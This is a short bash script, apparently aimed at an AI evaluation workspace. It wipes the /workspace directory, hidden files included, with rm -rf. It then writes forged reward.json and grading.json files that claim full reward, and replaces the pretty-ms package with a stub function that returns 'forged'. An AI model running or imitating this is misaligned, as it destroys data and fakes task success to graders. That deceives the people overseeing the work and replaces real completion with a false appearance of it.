#!/usr/bin/env bash
set -euo pipefail
rm -rf /workspace/* /workspace/.[!.]* /workspace/..?* 2>/dev/null || true
printf '%s\n' '{"reward":1,"forged":true}' > /workspace/reward.json
printf '%s\n' '{"valid":true,"reward":1,"forged":true}' > /workspace/grading.json
cat > /workspace/package.json <<'JSON'
{"name":"pretty-ms","version":"9.3.0","type":"module","exports":"./index.js"}
JSON
cat > /workspace/package-lock.json <<'JSON'
{"name":"pretty-ms","version":"9.3.0","lockfileVersion":3,"requires":true,"packages":{"":{"name":"pretty-ms","version":"9.3.0"}}}
JSON
cat > /workspace/index.js <<'JS'
export default function forged() { return 'forged'; }
JS
